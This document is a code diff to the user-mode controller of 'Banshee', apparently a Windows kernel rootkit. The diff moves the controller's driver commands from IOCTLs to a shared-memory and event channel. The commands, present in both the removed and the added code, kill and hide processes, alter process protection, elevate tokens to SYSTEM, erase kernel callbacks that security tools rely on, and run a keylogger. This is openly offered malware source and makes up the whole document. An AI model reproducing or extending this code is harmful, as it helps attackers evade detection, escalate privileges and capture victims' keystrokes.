@@ -5,37 +5,28 @@
 #include <filesystem>
 #include <codecvt>
 #include <locale>
-
-#define MAX_BURY_ARG_LENGTH 256
+#include <iostream>
 
 // --------------------------------------------------------------------------------------------------------
-// IOCTLs 
+// Commands
 
-#define BE_IOCTL_TEST_DRIVER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define BE_IOCTL_KILL_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define BE_IOCTL_PROTECT_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
-    ULONG pid;
-    BYTE newProtectionLevel;
-} IOCTL_PROTECT_PROCESS_PAYLOAD;
-
-#define BE_IOCTL_ELEVATE_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define BE_IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define BE_IOCTL_ENUMERATE_PROCESS_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define BE_IOCTL_ENUMERATE_THREAD_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define BE_IOCTL_ERASE_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define BE_IOCTL_START_KEYLOGGER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define BE_IOCTL_GET_KEYLOG CTL_CODE(FILE_DEVICE_UNKNOWN, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
+enum COMMAND_TYPE
+{
+    NONE = 0,
+    KILL_PROCESS = 1,
+    PROTECT_PROCESS = 2,
+    ELEVATE_TOKEN = 3,
+    HIDE_PROCESS = 4,
+    ENUM_CALLBACKS = 5,
+    ERASE_CALLBACKS = 6,
+    START_KEYLOGGER = 7,
+    UNLOAD = 8
+};
 
 enum CALLBACK_TYPE {
-    CreateProcessNotifyRoutine = 0,
-    CreateThreadNotifyRoutine = 1
+    CallbackTypeNone = 0,
+    CreateProcessNotifyRoutine = 1,
+    CreateThreadNotifyRoutine = 2
 };
 
 typedef struct _CALLBACK_DATA {
@@ -43,6 +34,15 @@ typedef struct _CALLBACK_DATA {
     UINT64 offset;
     WCHAR driverName[64];
 } CALLBACK_DATA;
+
+typedef struct _BANSHEE_PAYLOAD {
+    COMMAND_TYPE cmdType;
+    ULONG status;
+    ULONG ulValue;
+    BYTE byteValue;
+    WCHAR wcharString[64];
+    CALLBACK_DATA callbackData[32];
+} BANSHEE_PAYLOAD;
 
 // --------------------------------------------------------------------------------------------------------
 
@@ -70,20 +70,51 @@ BYTE PS_PROTECTED_NONE = 0x00; // Keine Keine
 
 // --------------------------------------------------------------------------------------------------------
 
-class Banshee 
+class Banshee
 {
 private:
-    HANDLE hDevice = NULL; 
+    HANDLE hMapFile = NULL;
+    BANSHEE_PAYLOAD* pSharedBuf = NULL;
+    HANDLE hCommandEvent = NULL;
+    HANDLE hAnswerEvent = NULL;
+
+    BANSHEE_STATUS
+    SendSimpleCommand(const PVOID& payload)
+    {
+        // Write command to shared memory
+        memcpy((PVOID)pSharedBuf, payload, sizeof(BANSHEE_PAYLOAD));
+
+        // Set the event to signalize that a payload was written
+        if (!SetEvent(hCommandEvent))
+        {
+            return BE_ERR_GENERIC;
+        }
+
+        // Wait for answer event, if it was written, read the simple answer from the buffer
+        // Simple answer = BE_STATUS code
+        DWORD dwWaitResult = WaitForSingleObject(hAnswerEvent, INFINITE);
+
+        // Reset the answer event after the answer was read
+        if (!ResetEvent(hAnswerEvent))
+        {
+            return BE_ERR_GENERIC;
+        }
+
+        return (BANSHEE_STATUS)pSharedBuf->status;
+    }
 
 public:
-	Banshee()
-	{
-        
-	}
+    Banshee()
+    {
+
+    }
 
     ~Banshee()
     {
-        this->Unload();
+        UnmapViewOfFile(pSharedBuf);
+        CloseHandle(hMapFile);
+        CloseHandle(hCommandEvent);
+        CloseHandle(hAnswerEvent);
     }
 
     /**
@@ -91,304 +122,125 @@ public:
      *
      * @return BANSHEE_STATUS status code.
      */
-    BANSHEE_STATUS 
-    Initialize()
+    BANSHEE_STATUS Initialize()
     {
-        auto BUF_SIZE = 4096;
+        auto BUF_SIZE = 1024 * 10; // TODO
 
         // Create file mappings for command and answer shared memory regions
-        HANDLE hCommandMapFile;
-        HANDLE hAnswerMapFile;
-        LPCTSTR pCommandBuf;
-        LPCTSTR pAnswerBuf;
-        
-        hAnswerMapFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, BUF_SIZE, L"Global\\BeAnswer");
-        hCommandMapFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, BUF_SIZE, L"Global\\BeCommand");
-        if (hCommandMapFile == NULL || hAnswerMapFile == NULL)
+        hMapFile = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, L"Global\\BeShared");
+        if (hMapFile == NULL)
         {
             return BE_ERR_FAILED_TO_INITIALIZE;
         }
 
-        pAnswerBuf = (LPTSTR)MapViewOfFile(hAnswerMapFile, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);
-        pCommandBuf = (LPTSTR)MapViewOfFile(hCommandMapFile, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);
-        if (pCommandBuf == NULL || pAnswerBuf == NULL)
+        pSharedBuf = (BANSHEE_PAYLOAD*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);
+        if (pSharedBuf == NULL)
         {
-            CloseHandle(hCommandMapFile);
-            CloseHandle(hAnswerMapFile);
+            return BE_ERR_FAILED_TO_INITIALIZE;
+        }
+
+        // Get handles to events
+        hCommandEvent = OpenEventW(SYNCHRONIZE | EVENT_MODIFY_STATE, FALSE, L"Global\\BeCommandEvent");
+        hAnswerEvent = OpenEventW(SYNCHRONIZE | EVENT_MODIFY_STATE, FALSE, L"Global\\BeAnswerEvent");
+
+        if (hCommandEvent == NULL || hAnswerEvent == NULL)
+        {
             return BE_ERR_FAILED_TO_INITIALIZE;
         }
 
         return BE_SUCCESS;
     }
 
-    /**
-     * Stops and deletes the driver and closes all handles.
-     *
-     * @return BANSHEE_STATUS status code.
-     */
-    BANSHEE_STATUS
-    Unload()
+    BANSHEE_STATUS KillProcess(const DWORD& pid)
     {
-        // Close device handle
-        if (this->hDevice)
-        {
-            CloseHandle(this->hDevice);
-        }
-
-        return BE_SUCCESS;
+        BANSHEE_PAYLOAD payload;
+        payload.cmdType = KILL_PROCESS;
+        payload.ulValue = pid;
+        return SendSimpleCommand((PVOID)&payload);
     }
 
-    /**
-     * Dispatches IOCTL to terminate process by PID.
-     *
-     * @param targetPid PID of the target process
-     * @return BANSHEE_STATUS status code.
-     */
-    BANSHEE_STATUS 
-    IoCtlKillProcess(const DWORD& targetPid) const
+    BANSHEE_STATUS HideProcess(const DWORD& pid)
     {
-        DWORD dwBytesReturned = 0;
-        DWORD outBuf = 0;
-
-        BOOL success = DeviceIoControl(
-            this->hDevice,
-            BE_IOCTL_KILL_PROCESS,
-            (LPVOID)&targetPid, sizeof(DWORD),
-            (LPVOID)&outBuf, sizeof(DWORD),
-            &dwBytesReturned, NULL
-        );
-
-        if (!success)
-        {
-            return BE_ERR_IOCTL;
-        }
-
-        return BE_SUCCESS;
+        BANSHEE_PAYLOAD payload;
+        payload.cmdType = HIDE_PROCESS;
+        payload.ulValue = pid;
+        return SendSimpleCommand((PVOID)&payload);
     }
 
-    /**
-     * Dispatches IOCTL to change the access token of a process to SYSTEM
-     *
-     * @param targetPid PID of the target process
-     * @return BANSHEE_STATUS status code.
-     */
-    BANSHEE_STATUS
-    IoCtlElevateProcessAccessToken(const DWORD& targetPid) const
+    BANSHEE_STATUS EraseCallbacks(std::string targetDriver, const CALLBACK_TYPE& cbType)
     {
-        DWORD dwBytesReturned = 0;
-
-        BOOL success = DeviceIoControl(
-            this->hDevice,
-            BE_IOCTL_ELEVATE_TOKEN,
-            (LPVOID)&targetPid, sizeof(DWORD),
-            NULL, 0,
-            &dwBytesReturned, NULL
-        );
-
-        if (!success)
-        {
-            return BE_ERR_IOCTL;
-        }
-
-        return BE_SUCCESS;
-    }
-
-    /**
-     * Dispatches IOCTL to hide a process by PID by removing it from the active process doubly linked list.
-     *
-     * @param targetPid PID of the target process
-     * @return BANSHEE_STATUS status code.
-     */
-    BANSHEE_STATUS
-    IoCtlHideProcess(const DWORD& targetPid) const
-    {
-        DWORD dwBytesReturned = 0;
-
-        BOOL success = DeviceIoControl(
-            this->hDevice,
-            BE_IOCTL_HIDE_PROCESS,
-            (LPVOID)&targetPid, sizeof(DWORD),
-            NULL, 0,
-            &dwBytesReturned, NULL
-        );
-
-        if (!success)
-        {
-            return BE_ERR_IOCTL;
-        }
-
-        return BE_SUCCESS;
-    }
-
-    /**
-     * Dispatches IOCTL to change the protection level of a process by directly modifying the EPROCESS structure
-     *
-     * @param targetPid PID of the target process
-     * @param newProtectionLevel Target protection level to set on the process
-     * @return BANSHEE_STATUS status code.
-     */
-    BANSHEE_STATUS 
-    IoCtlProtectProcess(const DWORD& targetPid, const BYTE& newProtectionLevel) const
-    {
-        IOCTL_PROTECT_PROCESS_PAYLOAD payload = {
-            targetPid,
-            newProtectionLevel
-        };
-        DWORD dwBytesReturned = 0;
-
-        BOOL success = DeviceIoControl(
-            this->hDevice,
-            BE_IOCTL_PROTECT_PROCESS,
-            (LPVOID)&payload, sizeof(IOCTL_PROTECT_PROCESS_PAYLOAD),
-            NULL, 0,
-            &dwBytesReturned, NULL
-        );
-
-        if (!success)
-        {
-            return BE_ERR_IOCTL;
-        }
-
-        return BE_SUCCESS;
-    }
-
-    /**
-     * Dispatches IOCTL to test driver functionality
-     *
-     * @return BANSHEE_STATUS status code.
-     */
-    BANSHEE_STATUS
-    IoCtlTestDriver() const
-    {
-        // Send a 7, receive a 6
-        DWORD dwBytesReturned = 0;
-        DWORD outBuf = 0;
-        DWORD iInput = 7;
-
-        BOOL success = DeviceIoControl(
-            this->hDevice,
-            BE_IOCTL_TEST_DRIVER,
-            (LPVOID)&iInput, sizeof(DWORD),
-            (LPVOID)&outBuf, sizeof(DWORD),
-            &dwBytesReturned, NULL
-        );
-
-        if (!success)
-        {
-            return BE_ERR_IOCTL;
-        }
-
-        return BE_SUCCESS;
-    }
-
-    /**
-     * Dispatches IOCTL to enumerate kernel callbacks
-     *
-     * @param type Type of kernel callback to resolve
-     * @param dataOut Vector for the output data
-     * @return BANSHEE_STATUS status code.
-     */
-    BANSHEE_STATUS
-    IoCtlEnumerateCallbacks(const CALLBACK_TYPE& type, std::vector<CALLBACK_DATA>& dataOut)
-    {
-        DWORD dwBytesReturned = 0;
-        auto outBuf = new CALLBACK_DATA[16]; // TODO: max number of kernel callbacks
-        RtlSecureZeroMemory(outBuf, sizeof(CALLBACK_DATA) * 16);
-#
-        ULONG IOCTL;
-        switch (type) 
-        {
-        case CreateProcessNotifyRoutine:
-            IOCTL = BE_IOCTL_ENUMERATE_PROCESS_CALLBACKS;
-            break;
-        case CreateThreadNotifyRoutine:
-            IOCTL = BE_IOCTL_ENUMERATE_THREAD_CALLBACKS;
-            break;
-        default:
-            return BE_ERR_GENERIC;
-            break;
-        }
-
-        BOOL success = DeviceIoControl(
-            this->hDevice,
-            IOCTL,
-            (LPVOID)outBuf, sizeof(CALLBACK_DATA) * 16, // TODO: max amount of callbacks as constant
-            (LPVOID)outBuf, sizeof(CALLBACK_DATA) * 16,
-            &dwBytesReturned, NULL
-        );
-
-        if (!success)
-        {
-            delete[] outBuf;
-            return BE_ERR_IOCTL;
-        }
-
-        for (INT i = 0; i < dwBytesReturned / sizeof(CALLBACK_DATA); ++i)
-        {
-            dataOut.push_back(outBuf[i]);
-        }
-
-        delete[] outBuf;
-        return BE_SUCCESS;
-    }
-
-    /**
-    * Dispatches IOCTL to erase kernel callbacks of a specific driver.
-    *
-    * @return BANSHEE_STATUS status code.
-    */
-    BANSHEE_STATUS
-    IoCtlEraseCallbacks(const std::string& targetDriver) const
-    {
-        DWORD dwBytesReturned = 0;
-
-        // Convert to wchar*
         INT wchars_num = MultiByteToWideChar(CP_UTF8, 0, targetDriver.c_str(), -1, NULL, 0);
-        wchar_t* wsTargetDriver = new wchar_t[wchars_num];
+        wchar_t* wsTargetDriver = new wchar_t[wchars_num];  
         MultiByteToWideChar(CP_UTF8, 0, targetDriver.c_str(), -1, wsTargetDriver, wchars_num);
 
-        BOOL success = DeviceIoControl(
-            this->hDevice,
-            BE_IOCTL_ERASE_CALLBACKS,
-            (LPVOID)wsTargetDriver, ((DWORD)(wcslen(wsTargetDriver) + 1)) * sizeof(WCHAR),
-            NULL, 0,
-            &dwBytesReturned, NULL
-        );
+        BANSHEE_PAYLOAD payload;
+        payload.cmdType = ERASE_CALLBACKS;
+        payload.ulValue = (ULONG)cbType;
+        memcpy(payload.wcharString, wsTargetDriver, wchars_num * sizeof(WCHAR));
 
         delete[] wsTargetDriver;
 
-        if (!success)
+        return SendSimpleCommand((PVOID)&payload);
+    }
+
+    BANSHEE_STATUS StartKeylogger(const BOOL& shouldStart)
+    {
+        BANSHEE_PAYLOAD payload;
+        payload.cmdType = START_KEYLOGGER;
+        payload.byteValue = shouldStart;
+        return SendSimpleCommand((PVOID)&payload);
+    }
+
+    BANSHEE_STATUS ElevateProcessAccessToken(const DWORD& pid)
+    {
+        BANSHEE_PAYLOAD payload;
+        payload.cmdType = ELEVATE_TOKEN;
+        payload.ulValue = pid;
+        return SendSimpleCommand((PVOID)&payload);
+    }
+
+    BANSHEE_STATUS ProtectProcess(const DWORD& pid, const BYTE& newLevel)
+    {
+        BANSHEE_PAYLOAD payload;
+        payload.cmdType = PROTECT_PROCESS;
+        payload.ulValue = pid;
+        payload.byteValue = newLevel;
+        return SendSimpleCommand((PVOID)&payload);
+    }
+
+    BANSHEE_STATUS EnumerateCallbacks(const CALLBACK_TYPE& type, OUT std::vector<CALLBACK_DATA>& callbackData)
+    {
+        BANSHEE_PAYLOAD payload;
+
+        payload.cmdType = ENUM_CALLBACKS;
+        payload.ulValue = (ULONG)type;
+
+        auto status = SendSimpleCommand((PVOID)&payload); 
+        if (status != BE_SUCCESS)
         {
-            return BE_ERR_IOCTL;
+            return status;
+        }
+        for (auto i = 0L; i < pSharedBuf->ulValue; ++i)
+        {
+            auto cbData = pSharedBuf->callbackData[i];
+            callbackData.push_back(
+                pSharedBuf->callbackData[i]
+            );
         }
         return BE_SUCCESS;
     }
 
-    /**
-    * Dispatches IOCTL to start or stop the keylogger.
-    *
-    * @param start TRUE to start, FALSE to stop
-    * @param status of the keylogger (TRUE if running, FALSE if stopped)
-    * @return BANSHEE_STATUS status code.
-    */
-    BANSHEE_STATUS
-    IoCtlStartKeylogger(const BOOLEAN& start) const
+    BANSHEE_STATUS Unload()
     {
-        DWORD dwBytesReturned = 0;
+        BANSHEE_PAYLOAD payload;
+        payload.cmdType = UNLOAD;
 
-        BOOL success = DeviceIoControl(
-            this->hDevice,
-            BE_IOCTL_START_KEYLOGGER,
-            (LPVOID)&start, sizeof(BOOLEAN),
-            NULL, 0,
-            &dwBytesReturned, NULL
-        );
-
-        if (!success)
+        // Write command to shared memory and set the event to signalize that a payload was written
+        memcpy((PVOID)pSharedBuf, &payload, sizeof(BANSHEE_PAYLOAD));
+        if (!SetEvent(hCommandEvent))
         {
-            return BE_ERR_IOCTL;
+            return BE_ERR_GENERIC;
         }
-
         return BE_SUCCESS;
     }
 };
